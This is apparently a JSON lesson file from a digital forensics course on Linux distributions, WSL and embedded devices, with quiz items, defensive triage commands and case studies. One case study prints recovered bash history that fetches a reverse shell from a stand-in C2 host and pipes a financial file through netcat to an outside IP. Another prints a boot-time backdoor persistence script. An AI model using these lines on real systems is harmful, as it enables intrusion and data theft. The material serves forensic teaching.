{
  "lesson_id": "be61eae8-3ca0-444c-83e6-908875190f60",
  "domain": "dfir",
  "title": "Linux Forensics Fundamentals and Distributions",
  "difficulty": 1,
  "order_index": 71,
  "prerequisites": [],
  "concepts": [
    "Linux Operating System Architecture",
    "Distribution Families",
    "Kernel vs Userspace",
    "Package Management Systems",
    "Windows Subsystem for Linux (WSL) Forensics",
    "Embedded Linux and Appliances",
    "Forensic Considerations for Different Distros"
  ],
  "estimated_time": 45,
  "learning_objectives": [
    "Understand Linux architecture and how it impacts forensic investigation",
    "Identify different Linux distribution families and their forensic artifacts",
    "Recognize the forensic differences between Debian, Red Hat, and Arch-based systems",
    "Investigate Windows Subsystem for Linux (WSL) environments",
    "Apply forensic techniques to embedded Linux systems and appliances",
    "Determine Linux distribution from disk images or memory dumps"
  ],
  "post_assessment": [
    {
      "question": "Which directory contains distribution-specific configuration files that can help identify the Linux distribution during forensics?",
      "options": [
        "/etc/ (contains /etc/os-release, /etc/lsb-release)",
        "/home/ (contains user files)",
        "/var/ (contains variable data)",
        "/tmp/ (contains temporary files)"
      ],
      "correct_answer": 0,
      "difficulty": 1,
      "type": "multiple_choice",
      "question_id": "ed4e8ced-1196-48e8-8ca7-0e2c30f6b281",
      "explanation": "Explanation not provided."
    },
    {
      "question": "What is the PRIMARY difference between Debian-based and Red Hat-based distributions that affects forensic artifact locations?",
      "options": [
        "They use the same package managers and log locations",
        "Debian uses .deb packages and apt, Red Hat uses .rpm packages and yum/dnf, affecting /var/log and package databases",
        "Red Hat doesn't support system logging",
        "Debian stores all logs in /home/"
      ],
      "correct_answer": 1,
      "difficulty": 2,
      "type": "multiple_choice",
      "question_id": "72ec7034-5a33-4646-aab3-e5cc7e1f3551",
      "explanation": "Explanation not provided."
    },
    {
      "question": "When investigating a Windows Subsystem for Linux (WSL) installation, where are the Linux filesystem artifacts stored on the Windows host?",
      "options": [
        "C:\\Windows\\System32\\",
        "C:\\Users\\[username]\\AppData\\Local\\Packages\\[distro]\\LocalState\\rootfs\\",
        "C:\\Program Files\\WSL\\",
        "D:\\WSL\\"
      ],
      "correct_answer": 1,
      "difficulty": 2,
      "type": "multiple_choice",
      "question_id": "24d288a3-4fa1-48ab-b115-4b23f7708a4c",
      "explanation": "Explanation not provided."
    }
  ],
  "jim_kwik_principles": [
    "active_learning",
    "minimum_effective_dose",
    "teach_like_im_10",
    "memory_hooks",
    "meta_learning",
    "connect_to_what_i_know",
    "reframe_limiting_beliefs",
    "gamify_it",
    "learning_sprint",
    "multiple_memory_pathways"
  ],
  "content_blocks": [
    {
      "type": "mindset_coach",
      "content": {
        "text": "Welcome to Linux forensics - you're about to learn skills that will make you invaluable in incident response and digital investigations. Here's what makes Linux forensics both challenging and exciting: while Windows dominates desktop environments, Linux powers the internet. Web servers, cloud infrastructure, IoT devices, Android phones, network appliances, and critical infrastructure all run Linux. When a breach happens at scale, you're investigating Linux systems.\n\nMany investigators feel intimidated by Linux - the command line, the different distributions, the open-source nature. Here's the truth: Linux forensics is actually MORE structured than Windows once you understand the fundamentals. Everything is a file. Configuration is text-based. Logs are human-readable. The filesystem hierarchy is standardized. You don't need to memorize hundreds of distributions - they all follow the same core principles with slight variations.\n\nThink of Linux distributions like car brands: a Toyota and a Honda have different features, but both have an engine, transmission, wheels, and steering wheel. Same with Linux - Debian, Red Hat, and Arch may use different package managers and default configurations, but they all have the same kernel, filesystem structure, logging mechanisms, and core utilities. Learn the fundamentals once, apply them everywhere.\n\nThis lesson builds your foundation. You'll understand how Linux works at an architectural level, recognize the major distribution families and their forensic differences, and investigate specialized Linux environments like WSL (Windows Subsystem for Linux) and embedded appliances. By the end, you'll look at any Linux system and immediately know where to find artifacts, how to extract evidence, and what makes each distribution unique.\n\nThe beautiful part: Linux systems often contain MORE forensic artifacts than Windows because everything is logged, everything is configurable, and nothing is hidden. Attackers can delete files, clear logs, and remove tools - but they leave traces everywhere. You're learning to find those traces.\n\nReady to become a Linux forensics investigator? Let's start with how Linux actually works."
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "# Linux Operating System Architecture\n\n## What is Linux?\n\n**Linux** is an open-source, Unix-like operating system kernel created by Linus Torvalds in 1991. Unlike Windows or macOS, Linux is not a single operating system - it's a kernel that different organizations package with software, utilities, and tools to create **distributions** (distros).\n\n### Why This Matters for Forensics\n\nWhen you investigate a Windows system, you know exactly where to look: C:\\Windows\\System32, Registry hives, Event Logs. With Linux, the distribution affects:\n\n- **Package management**: Where software is installed and tracked\n- **Log locations**: Some distros use different logging paths\n- **Init system**: systemd vs older init systems\n- **Default configurations**: Security settings, services, file locations\n\nYou need to identify the distribution first, then adjust your investigation accordingly.\n\n## Linux Architecture Layers\n\n```\n┌─────────────────────────────────────────┐\n│         USER APPLICATIONS               │  (Firefox, Apache, databases)\n│  (bash, ssh, web browsers, servers)     │\n├─────────────────────────────────────────┤\n│         USER SPACE                      │\n│  System utilities, libraries, shells    │  \n│  (/bin, /usr/bin, /sbin, /usr/sbin)    │\n├─────────────────────────────────────────┤\n│      SYSTEM CALL INTERFACE              │  (Boundary between user/kernel)\n│         (syscalls)                      │\n├─────────────────────────────────────────┤\n│         LINUX KERNEL                    │  \n│  Process management, memory, drivers    │  Kernel Space\n│  Filesystem, networking, security       │\n├─────────────────────────────────────────┤\n│         HARDWARE                        │\n│  CPU, RAM, Disk, Network Cards          │\n└─────────────────────────────────────────┘\n```bash\n\n### Kernel Space vs User Space\n\n**Kernel Space** (privileged mode):\n- Runs with full hardware access (Ring 0)\n- Manages processes, memory, filesystems, devices\n- Kernel modules (drivers) run here\n- **Forensic Value**: Process structures, network connections, loaded modules\n\n**User Space** (unprivileged mode):\n- Applications, utilities, user processes\n- Limited hardware access (must use system calls)\n- Where attackers operate (usually)\n- **Forensic Value**: Logs, configuration files, command history, persistence mechanisms\n\n**Forensic Implication**: Rootkits hide in kernel space, malware runs in user space. You need different tools for each layer (kernel: memory forensics; user: disk forensics).\n\n## Linux Filesystem Hierarchy Standard (FHS)\n\n**Every Linux distribution follows the Filesystem Hierarchy Standard** - a defined directory structure:\n\n| Directory | Purpose | Forensic Value |\n|-----------|---------|----------------|\n| **/** | Root directory | Everything starts here |\n| **/bin** | Essential user binaries (ls, cat, bash) | Check for trojanized binaries |\n| **/boot** | Bootloader, kernel files | Boot sector malware, kernel rootkits |\n| **/dev** | Device files (disks, terminals) | Check for unusual devices |\n| **/etc** | System configuration files | **HIGH VALUE** - configs, cron jobs, services |\n| **/home** | User home directories | **HIGH VALUE** - user files, bash history, ssh keys |\n| **/lib** | Shared libraries | Check for malicious libraries (LD_PRELOAD) |\n| **/mnt** | Temporary mount points | Check for mounted network shares |\n| **/opt** | Optional application packages | Third-party software installations |\n| **/proc** | Process and kernel information | **HIGH VALUE** - running processes, network connections (virtual filesystem) |\n| **/root** | Root user's home directory | **HIGH VALUE** - root user history, tools |\n| **/sbin** | System binaries (admin tools) | Check for trojanized admin tools |\n| **/tmp** | Temporary files | **HIGH VALUE** - attacker staging area, recent activity |\n| **/usr** | User programs and data | Applications, logs, libraries |\n| **/var** | Variable data (logs, databases) | **HIGHEST VALUE** - /var/log contains all logs |\n\n**Memory Aid - \"BETH VR\" for high-value forensic directories**:\n- **/B**oot - Bootloader and kernel\n- **/E**tc - Configuration files\n- **/T**mp - Temporary files\n- **/H**ome - User data\n- **/V**ar - Logs and variable data\n- **/R**oot - Root user home\n\n## Linux Distributions: The Big Three Families\n\nThink of distributions as pre-configured Linux systems with specific package managers, default software, and configurations. There are hundreds of distributions, but **99% are based on three families**:\n\n### 1. Debian Family\n\n**Parent**: Debian GNU/Linux\n\n**Major Distributions**:\n- **Ubuntu** (most popular desktop/server Linux)\n- **Linux Mint** (desktop-focused)\n- **Kali Linux** (penetration testing - you'll see this in IR)\n- **Raspbian/Raspberry Pi OS** (Raspberry Pi devices)\n\n**Package Management**:\n- Package format: **.deb** files\n- Package manager: **apt** (Advanced Package Tool) or **dpkg**\n- Package database: **/var/lib/dpkg/**\n\n**Forensic Commands**:\n```bash\n# List installed packages\ndpkg -l\n\n# Check when package was installed\nls -l /var/lib/dpkg/info/*.list\n\n# View package installation log\ncat /var/log/apt/history.log\ncat /var/log/dpkg.log\n```\n\n**Key Characteristics**:\n- Configuration in **/etc/apt/sources.list**\n- Logs in **/var/log/apt/** and **/var/log/dpkg.log**\n- User-friendly, stable, well-documented\n\n**Identifying Debian-based system**:\n```bash\ncat /etc/os-release\n# ID=debian or ID=ubuntu\n\ncat /etc/issue\n# Debian GNU/Linux or Ubuntu\n\nls /etc/*release*\n# /etc/debian_version exists\n```bash\n\n### 2. Red Hat Family\n\n**Parent**: Red Hat Enterprise Linux (RHEL)\n\n**Major Distributions**:\n- **Red Hat Enterprise Linux (RHEL)** (commercial, enterprise)\n- **CentOS** (free RHEL clone, now CentOS Stream)\n- **Fedora** (cutting-edge, community)\n- **Rocky Linux / AlmaLinux** (CentOS replacements)\n- **Oracle Linux** (enterprise)\n\n**Package Management**:\n- Package format: **.rpm** files (Red Hat Package Manager)\n- Package managers: **yum** (older), **dnf** (newer)\n- Package database: **/var/lib/rpm/**\n\n**Forensic Commands**:\n```bash\n# List installed packages\nrpm -qa\n\n# Check package installation time\nrpm -qa --last\n\n# Query specific package\nrpm -qi package_name\n\n# View yum/dnf transaction history\ncat /var/log/yum.log\ndnf history\n```\n\n**Key Characteristics**:\n- Configuration in **/etc/yum.repos.d/** or **/etc/dnf/**\n- Logs in **/var/log/yum.log** or **/var/log/dnf.log**\n- SELinux enabled by default (Security-Enhanced Linux)\n- Enterprise-focused, stable, long support cycles\n\n**Identifying Red Hat-based system**:\n```bash\ncat /etc/os-release\n# ID=\"rhel\" or ID=\"centos\" or ID=\"fedora\"\n\ncat /etc/redhat-release\n# Red Hat Enterprise Linux or CentOS Linux\n\nls /etc/*release*\n# /etc/redhat-release exists\n```bash\n\n### 3. Arch Family\n\n**Parent**: Arch Linux\n\n**Major Distributions**:\n- **Arch Linux** (minimalist, rolling release)\n- **Manjaro** (user-friendly Arch)\n- **EndeavourOS** (Arch-based)\n\n**Package Management**:\n- Package format: **.pkg.tar.zst** files\n- Package manager: **pacman**\n- Package database: **/var/lib/pacman/**\n\n**Forensic Commands**:\n```bash\n# List installed packages\npacman -Q\n\n# View package installation log\ncat /var/log/pacman.log\n\n# Query package details\npacman -Qi package_name\n```\n\n**Key Characteristics**:\n- Rolling release (continuous updates, no version numbers)\n- Minimalist design (install only what you need)\n- Cutting-edge software (latest versions)\n- Less common in enterprise, more in advanced user environments\n\n**Identifying Arch-based system**:\n```bash\ncat /etc/os-release\n# ID=arch or ID=manjaro\n\nls /etc/pacman.conf\n# Pacman config exists\n```bash\n\n## Quick Distribution Identification Workflow\n\nWhen you acquire a Linux disk image or access a live system:\n\n```bash\n# Step 1: Check os-release (most reliable)\ncat /etc/os-release\n# Output:\n#   ID=ubuntu\n#   VERSION_ID=\"22.04\"\n#   PRETTY_NAME=\"Ubuntu 22.04.1 LTS\"\n\n# Step 2: Check issue file\ncat /etc/issue\n# Output: Ubuntu 22.04.1 LTS \\n \\l\n\n# Step 3: Check for distro-specific files\nls /etc/*release* /etc/*version*\n# Debian: /etc/debian_version\n# Red Hat: /etc/redhat-release\n# Ubuntu: /etc/lsb-release\n\n# Step 4: Check package manager\nwhich apt dpkg yum dnf pacman\n# Debian: apt, dpkg\n# Red Hat: yum, dnf\n# Arch: pacman\n\n# Step 5: Check kernel version\nuname -a\n# Linux hostname 5.15.0-56-generic #62-Ubuntu SMP x86_64 GNU/Linux\n```bash\n\n## Why Distribution Matters: Real-World Example\n\n**Scenario**: You're investigating a compromised web server. You need to check for persistence mechanisms.\n\n**Debian/Ubuntu**:\n```bash\n# Check scheduled tasks\nls /etc/cron.*\ncat /etc/crontab\nsystemctl list-unit-files | grep enabled\n\n# Check installed packages for backdoors\ndpkg -l | grep -E \"(suspicious|shell|backdoor)\"\ncat /var/log/dpkg.log | tail -100\n\n# Check services\nsystemctl list-units --type=service\nls /etc/systemd/system/\n```\n\n**Red Hat/CentOS**:\n```bash\n# Check scheduled tasks (same)\nls /etc/cron.*\ncat /etc/crontab\nsystemctl list-unit-files | grep enabled\n\n# Check installed packages (different command)\nrpm -qa --last | head -50\ncat /var/log/yum.log | tail -100\n\n# Check services (same)\nsystemctl list-units --type=service\nls /etc/systemd/system/\n\n# Check SELinux (Red Hat-specific)\ngetenforce\naudit2why < /var/log/audit/audit.log\n```\n\nSee the difference? Same investigation, different commands and log locations.\n\n## Windows Subsystem for Linux (WSL) Forensics\n\n**WSL** allows running a Linux distribution directly on Windows 10/11 without virtualization. This is increasingly common in enterprise environments and is used by both developers and attackers.\n\n### WSL Versions\n\n**WSL 1** (older):\n- Translation layer (not a VM)\n- Converts Linux system calls to Windows NT kernel calls\n- Better filesystem performance for Windows drives\n\n**WSL 2** (current):\n- Real Linux kernel running in lightweight VM\n- Full system call compatibility\n- Better Linux filesystem performance\n\n### Forensic Artifacts: Where is WSL on Windows?\n\n**WSL Distribution Files**:\n```\nC:\\Users\\[username]\\AppData\\Local\\Packages\\[distribution]\\LocalState\\rootfs\\\n```\n\nExamples:\n- Ubuntu: `CanonicalGroupLimited.Ubuntu22.04LTS_...\\LocalState\\rootfs\\`\n- Debian: `TheDebianProject.DebianGNULinux_...\\LocalState\\rootfs\\`\n- Kali: `KaliLinux.54290C8133FEE_...\\LocalState\\rootfs\\`\n\n**This rootfs folder is a complete Linux filesystem** - you can investigate it like any Linux disk:\n\n```powershell\n# On Windows host, navigate to WSL filesystem\ncd C:\\Users\\analyst\\AppData\\Local\\Packages\\CanonicalGroupLimited.Ubuntu22.04LTS_79rhkp1fndgsc\\LocalState\\rootfs\n\n# You'll see:\nbin/  boot/  dev/  etc/  home/  lib/  mnt/  opt/  proc/  root/  sbin/  tmp/  usr/  var/\n```\n\n**Forensic Investigation of WSL**:\n\n1. **Find WSL installations**:\n```powershell\n# PowerShell on Windows\nwsl --list --verbose\n# Output: NAME, STATE, VERSION\n\ndir $env:LOCALAPPDATA\\Packages | findstr -i \"ubuntu debian kali\"\n```\n\n2. **Access WSL filesystem from Windows**:\n```powershell\n# Method 1: Direct path\ncd \\\\wsl$\\Ubuntu-22.04\\home\\user\n\n# Method 2: Via AppData\ncd C:\\Users\\[user]\\AppData\\Local\\Packages\\[distro]\\LocalState\\rootfs\\home\\user\n```\n\n3. **Investigate as normal Linux system**:\n```bash\n# Check bash history\ntype C:\\Users\\user\\AppData\\Local\\Packages\\[distro]\\LocalState\\rootfs\\home\\user\\.bash_history\n\n# Check logs\ndir C:\\Users\\user\\AppData\\Local\\Packages\\[distro]\\LocalState\\rootfs\\var\\log\n\n# Check cron jobs\ntype C:\\Users\\user\\AppData\\Local\\Packages\\[distro]\\LocalState\\rootfs\\etc\\crontab\n```\n\n4. **WSL-specific artifacts on Windows**:\n```powershell\n# WSL launch history (Windows Event Logs)\nGet-WinEvent -LogName Microsoft-Windows-Subsystem-Linux/Operational\n\n# Registry keys\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Lxss\n```\n\n**Why WSL is Important for Forensics**:\n- Attackers use WSL to run Linux tools on Windows networks\n- Bypass Windows endpoint protection (some EDR doesn't monitor WSL)\n- Access Linux-only exploitation tools (Metasploit, Nmap, etc.)\n- Evade detection (WSL processes look like Windows processes)\n\n**Real-World Attack Pattern**:\n1. Attacker compromises Windows workstation\n2. Installs WSL (wsl --install) - requires admin\n3. Installs Kali Linux distribution\n4. Runs penetration testing tools from Kali\n5. Exfiltrates data using Linux utilities\n6. Windows AV/EDR doesn't flag Linux binaries\n\n**Detection**: Look for WSL installation artifacts, unusual network connections from wsl.exe, Linux tools in AppData\\Local\\Packages.\n\n## Embedded Linux and Appliances\n\n**Embedded Linux** powers countless devices: routers, firewalls, NAS devices, IoT sensors, smart TVs, industrial control systems, and security cameras.\n\n### Characteristics\n\n- **Minimal installations** (only necessary software)\n- **Custom configurations** (vendor-specific)\n- **Read-only filesystems** (sometimes)\n- **Limited logging** (small storage)\n- **BusyBox** (lightweight utilities replacing full GNU tools)\n\n### Common Embedded Linux Platforms\n\n**1. OpenWrt / DD-WRT** (routers, access points)\n- Router firmware for Linksys, TP-Link, etc.\n- Web GUI for configuration\n- Logs in /var/log (often tmpfs - lost on reboot)\n\n**2. Synology DSM / QNAP QTS** (NAS devices)\n- Full Linux underneath web interface\n- Logs in /var/log\n- PostgreSQL database for system configs\n\n**3. Ubiquiti UniFi** (networking equipment)\n- Debian-based\n- Controller software runs MongoDB\n- Logs in /var/log/unifi\n\n**4. Raspberry Pi OS** (Raspberry Pi devices)\n- Debian-based\n- Standard Linux forensics apply\n- Often used in IoT projects and education\n\n### Forensic Challenges with Embedded Linux\n\n**Challenge 1: Limited shell access**\n- Many appliances have no SSH or restricted shells\n- Solution: Extract firmware, acquire disk image, or use JTAG/UART\n\n**Challenge 2: Volatile storage**\n- /tmp and /var/log often mounted as tmpfs (RAM disk)\n- Lost on reboot\n- Solution: Perform live response, memory acquisition\n\n**Challenge 3: Proprietary modifications**\n- Vendors customize Linux heavily\n- Non-standard locations, encrypted configs\n- Solution: Vendor documentation, firmware analysis\n\n**Challenge 4: Minimal tooling**\n- No Python, Perl, or standard forensic tools\n- BusyBox provides limited versions of commands\n- Solution: Static-compiled forensic tools (Go, Rust)\n\n### Forensic Approach to Embedded Linux\n\n1. **Identify the device and OS**:\n```bash\ncat /proc/version\ncat /etc/os-release  # May not exist\nuname -a\n```\n\n2. **Check available tools**:\n```bash\nls /bin /sbin /usr/bin /usr/sbin\nbusybox --list  # If using BusyBox\n```\n\n3. **Collect volatile data FIRST** (before reboot):\n```bash\n# Process list\nps aux\n\n# Network connections\nnetstat -antp\n\n# Mounted filesystems\nmount\ndf -h\n\n# Current users\nw\nwho\n```\n\n4. **Acquire persistent storage**:\n```bash\n# Find storage devices\nfdisk -l\nblkid\n\n# Image device\ndd if=/dev/mmcblk0 of=/mnt/usb/device.img bs=4M\n```\n\n5. **Analyze firmware** (if extracted):\n- Use binwalk to extract filesystem\n- Mount extracted filesystem\n- Investigate as normal Linux system\n\n## Key Takeaways\n\n1. **Linux is a kernel**, distributions are packaged systems with different tooling\n2. **Three major families**: Debian (apt/.deb), Red Hat (yum/dnf/.rpm), Arch (pacman)\n3. **Identify distribution first**: cat /etc/os-release, check package managers\n4. **Filesystem Hierarchy is standard**: /etc, /var/log, /home are your gold mines\n5. **WSL is Linux on Windows**: Investigate rootfs folder in AppData\\Local\\Packages\n6. **Embedded Linux is everywhere**: Routers, NAS, IoT - often minimal with limited logs\n7. **Package management differs**: dpkg vs rpm vs pacman affects artifact locations\n8. **Volatility matters**: Embedded systems often use tmpfs - acquire memory/disk before reboot\n\nNext lesson, we'll dive deep into the Linux filesystem structure and explore exactly where forensic artifacts live."
      }
    },
    {
      "type": "code_exercise",
      "content": {
        "text": "# Hands-On: Linux Distribution Identification\n\nPractice identifying Linux distributions and locating key forensic artifacts.\n\n## Exercise 1: Identify Distribution from Disk Image\n\nYou've acquired a disk image. Mount it and identify the distribution:\n\n```bash\n# Mount disk image (read-only)\nsudo mkdir /mnt/evidence\nsudo mount -o ro,loop evidence.img /mnt/evidence\n\n# Identify distribution\ncat /mnt/evidence/etc/os-release\ncat /mnt/evidence/etc/issue\nls /mnt/evidence/etc/*release* /mnt/evidence/etc/*version*\n\n# Determine package manager\nls /mnt/evidence/var/lib/dpkg  # Debian-based\nls /mnt/evidence/var/lib/rpm   # Red Hat-based\nls /mnt/evidence/var/lib/pacman  # Arch-based\n\n# Check installed packages\nif [ -d /mnt/evidence/var/lib/dpkg ]; then\ncat /mnt/evidence/var/lib/dpkg/status | grep -E \"^Package|^Status\" | head -20\nfi\n\nif [ -d /mnt/evidence/var/lib/rpm ]; then\nsudo chroot /mnt/evidence rpm -qa | head -20\nfi\n```bash\n\n## Exercise 2: Investigate WSL Installation on Windows\n\nOn a Windows host with WSL installed:\n\n```powershell\n# PowerShell commands\n\n# List WSL distributions\nwsl --list --verbose\n\n# Find WSL installation folders\nGet-ChildItem $env:LOCALAPPDATA\\Packages | Where-Object {$_.Name -match \"ubuntu|debian|kali\"}\n\n# Example: Investigate Ubuntu WSL\n$wslPath = \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Packages\\CanonicalGroupLimited.Ubuntu22.04LTS_79rhkp1fndgsc\\LocalState\\rootfs\"\n\n# Check if exists\nTest-Path $wslPath\n\n# List home directories\nGet-ChildItem \"$wslPath\\home\"\n\n# Check bash history\nGet-Content \"$wslPath\\home\\*\\.bash_history\"\n\n# Check cron jobs\nGet-Content \"$wslPath\\etc\\crontab\"\nGet-ChildItem \"$wslPath\\etc\\cron.*\"\n\n# Check recent logs\nGet-ChildItem \"$wslPath\\var\\log\" | Sort-Object LastWriteTime -Descending | Select-Object -First 10\n```bash\n\n## Exercise 3: Package Manager Forensics\n\n### Debian/Ubuntu System:\n\n```bash\n# List all installed packages with dates\ndpkg -l | head -20\n\n# Find recently installed packages (last 7 days)\nfind /var/lib/dpkg/info -name \"*.list\" -mtime -7 -exec ls -lh {} \\;\n\n# View package installation history\ncat /var/log/dpkg.log\ncat /var/log/apt/history.log\n\n# Search for specific package installation\ngrep -i \"install.*netcat\" /var/log/dpkg.log\n\n# Check for suspicious packages\ndpkg -l | grep -iE \"(backdoor|shell|tunnel|proxy|scanner)\"\n```bash\n\n### Red Hat/CentOS System:\n\n```bash\n# List packages by installation date (most recent first)\nrpm -qa --last | head -20\n\n# Query specific package details\nrpm -qi openssh-server\n\n# View yum/dnf transaction log\ncat /var/log/yum.log\ndnf history\n\n# List files installed by package\nrpm -ql openssh-server\n\n# Find which package owns a file\nrpm -qf /usr/sbin/sshd\n```bash\n\n## Exercise 4: Embedded Linux Investigation\n\nInvestigating a router or IoT device:\n\n```bash\n# Identify system\nuname -a\ncat /proc/version\ncat /proc/cpuinfo | grep -i \"model\\|hardware\"\n\n# Check for BusyBox\nbusybox --list\n\n# List mounted filesystems\nmount\ncat /proc/mounts\n\n# Find persistent storage\ndf -h\nfdisk -l 2>/dev/null\n\n# Check for configuration backup\nfind / -name \"*.cfg\" -o -name \"*.conf\" -o -name \"*.config\" 2>/dev/null\n\n# Collect network configuration\nifconfig -a\nip addr show\ncat /etc/network/interfaces 2>/dev/null\ncat /etc/config/network 2>/dev/null  # OpenWrt\n\n# Check iptables rules\niptables -L -n\niptables-save\n\n# Examine running processes\nps aux\ntop -bn1\n```bash\n\n## Exercise 5: Quick Triage Script\n\nCreate a quick distribution identification script:\n\n```bash\n# !/bin/bash\n# linux_distro_id.sh - Quick distribution identification\n\necho \"=== Linux Distribution Identification ===\"\necho \"\"\n\necho \"[*] Checking /etc/os-release\"\nif [ -f /etc/os-release ]; then\ncat /etc/os-release | grep -E \"^(ID|VERSION_ID|PRETTY_NAME)=\"\nfi\necho \"\"\n\necho \"[*] Checking /etc/issue\"\nif [ -f /etc/issue ]; then\ncat /etc/issue\nfi\necho \"\"\n\necho \"[*] Checking distribution-specific files\"\nfor file in /etc/debian_version /etc/redhat-release /etc/centos-release /etc/fedora-release; do\nif [ -f $file ]; then\necho \"Found: $file\"\ncat $file\nfi\ndone\necho \"\"\n\necho \"[*] Package Manager Detection\"\nif command -v dpkg &> /dev/null; then\necho \"Debian-based (dpkg found)\"\necho \"Package count: $(dpkg -l | grep ^ii | wc -l)\"\nelif command -v rpm &> /dev/null; then\necho \"Red Hat-based (rpm found)\"\necho \"Package count: $(rpm -qa | wc -l)\"\nelif command -v pacman &> /dev/null; then\necho \"Arch-based (pacman found)\"\necho \"Package count: $(pacman -Q | wc -l)\"\nfi\necho \"\"\n\necho \"[*] Kernel Information\"\nuname -a\necho \"\"\n\necho \"[*] Init System\"\nif [ -d /run/systemd/system ]; then\necho \"systemd\"\nsystemctl --version | head -1\nelif [ -f /sbin/init ] && file /sbin/init | grep -q \"upstart\"; then\necho \"Upstart\"\nelse\necho \"SysVinit or unknown\"\nfi\n```\n\nRun on target system:\n```bash\nchmod +x linux_distro_id.sh\n./linux_distro_id.sh\n```bash\n\n## Expected Outputs\n\n**Ubuntu 22.04**:\n```\nID=ubuntu\nVERSION_ID=\"22.04\"\nPRETTY_NAME=\"Ubuntu 22.04.1 LTS\"\nDebian-based (dpkg found)\nPackage count: 1847\nsystemd 249 (249.11-0ubuntu3.6)\n```\n\n**CentOS 7**:\n```\nID=\"centos\"\nVERSION_ID=\"7\"\nPRETTY_NAME=\"CentOS Linux 7 (Core)\"\nRed Hat-based (rpm found)\nPackage count: 523\nsystemd 219\n```\n\n**Kali Linux**:\n```\nID=kali\nVERSION_ID=\"2023.1\"\nPRETTY_NAME=\"Kali GNU/Linux Rolling\"\nDebian-based (dpkg found)\nPackage count: 4293\nsystemd 252\n```"
      }
    },
    {
      "type": "real_world",
      "content": {
        "text": "# Real-World Case Studies\n\n## Case Study 1: The WSL Backdoor (Financial Services, 2022)\n\n**Scenario**: A financial services company detected unusual network traffic from a Windows workstation in the accounting department. Initial EDR scans found nothing suspicious.\n\n**Investigation**:\n\nIncident responder examined the workstation and found:\n\n```powershell\n# Checked running processes\nGet-Process | Where-Object {$_.ProcessName -like \"*wsl*\"}\n# Found: wslhost.exe, wsl.exe running\n\n# Listed WSL distributions\nwsl --list --verbose\n# Output: Ubuntu-20.04 (Running)\n```\n\nThe user claimed they never installed WSL. Deeper investigation:\n\n```powershell\n# Found WSL installation\n$wslPath = \"C:\\Users\\jsmith\\AppData\\Local\\Packages\\CanonicalGroupLimited.Ubuntu20.04onWindows_79rhkp1fndgsc\\LocalState\\rootfs\"\n\n# Checked bash history\ntype $wslPath\\home\\attacker\\.bash_history\n```\n\n**Findings in bash_history**:\n```bash\ncurl -O http://malicious-c2.com/reverse_shell.py\npython3 reverse_shell.py 203.0.113.50 4444\nnmap -sV 10.10.0.0/16\ncat /mnt/c/Users/jsmith/Documents/financial_data.xlsx\nbase64 /mnt/c/Users/jsmith/Documents/financial_data.xlsx | nc 203.0.113.50 5555\nrm reverse_shell.py\nhistory -c\n```\n\n**Attack Timeline**:\n1. Attacker gained initial access via phishing (stole credentials)\n2. RDP'd to workstation (legitimate user credentials)\n3. Installed WSL using `wsl --install` (required admin rights - user was local admin)\n4. Installed Ubuntu distribution\n5. Downloaded reverse shell script\n6. Scanned internal network from WSL\n7. Exfiltrated financial data through WSL using netcat\n8. Attempted to clear bash history (failed - file was already written)\n\n**Why EDR Missed It**:\n- EDR monitored Windows processes but had limited visibility into WSL\n- Linux binaries in WSL weren't scanned\n- Network connections appeared to come from wsl.exe (legitimate Windows process)\n- Attacker used Linux tools that Windows AV doesn't recognize\n\n**Forensic Artifacts**:\n- WSL installation logs in Windows Event Viewer\n- Bash history in WSL rootfs\n- Network connections logged by Windows firewall\n- RDP login events (Event ID 4624)\n- Process creation events for wsl.exe (Sysmon Event ID 1)\n\n**Lessons Learned**:\n- Monitor WSL installations in enterprise environments\n- Extend EDR monitoring into WSL environments\n- Restrict local admin rights\n- Implement application whitelisting (block wsl.exe for non-developers)\n\n## Case Study 2: The Embedded Router Backdoor (Manufacturing, 2021)\n\n**Scenario**: Manufacturing facility discovered unauthorized remote access to their network. Initial investigation found nothing on Windows workstations or servers.\n\n**Breakthrough**: Network team noticed unusual SSH connection from internet to internal router (Ubiquiti EdgeRouter).\n\n**Investigation**:\n\n```bash\n# SSH to router\nssh admin@192.168.1.1\n\n# Check OS\nuname -a\n# Linux EdgeRouter 3.10.107-UBNT #1 SMP Wed Jun 5 04:30:00 UTC 2019 mips64 GNU/Linux\n\ncat /etc/version\n# v2.0.9-hotfix.4\n\n# Check running processes\nps aux | grep -v \"\\[\" | head -20\n# Found: /usr/bin/dropbear (SSH server) - expected\n#        /tmp/.backdoor (suspicious process)\n\n# Examine suspicious process\nls -la /tmp/.backdoor\n# -rwxr-xr-x 1 root root 45672 Oct 15 03:22 /tmp/.backdoor\n\n# Check what it does\nfile /tmp/.backdoor\n# ELF 64-bit LSB executable, MIPS\n\nstrings /tmp/.backdoor | grep -E \"(connect|socket|IP|port)\"\n# connect_to_c2\n# 203.0.113.99:8443\n\n# Check how it persists\ncat /etc/rc.local\n# (empty)\n\ncat /config/scripts/post-config.d/*\n# Found: /config/scripts/post-config.d/start_monitor.sh\n# #!/bin/sh\n# cp /config/.backup/.monitor /tmp/.backdoor\n# chmod +x /tmp/.backdoor\n# /tmp/.backdoor &\n\n# Found the backdoor binary\nls -la /config/.backup/\n# -rw-r--r-- 1 root root 45672 Oct 15 03:22 .monitor\n```\n\n**Attack Analysis**:\n\n2. Uploaded backdoor binary to /config/.backup/ (persistent storage)\n3. Created post-config script to launch backdoor on boot\n4. Backdoor runs from /tmp/ (RAM disk - no disk wear)\n5. Establishes reverse shell to attacker C2\n\n**Why It Went Undetected**:\n- Embedded router not monitored by EDR/AV\n- No centralized logging from router\n- Firmware updates not applied (vulnerable version)\n- Default credentials still in use\n\n**Forensic Challenges**:\n- Limited forensic tools on embedded device (no python, perl)\n- /tmp is tmpfs (RAM) - lost on reboot\n- Minimal logging\n- Backdoor binary was stripped (no debug symbols)\n\n**Forensic Collection**:\n\n```bash\n# Collect configuration\nshow configuration\nshow configuration commands | cat > /tmp/config_backup.txt\n\n# Collect process list\nps aux > /tmp/processes.txt\n\n# Collect network connections\nnetstat -antp > /tmp/network.txt\n\n# Collect filesystem\nfind / -type f -mtime -30 > /tmp/recent_files.txt\n\n# Image persistent storage\ndd if=/dev/mtdblock4 of=/tmp/usb/config_backup.img bs=1M\n\n# Copy evidence to USB\ncp /tmp/*.txt /tmp/usb/\ncp /tmp/.backdoor /tmp/usb/\ncp /config/.backup/.monitor /tmp/usb/\ncp /config/scripts/post-config.d/* 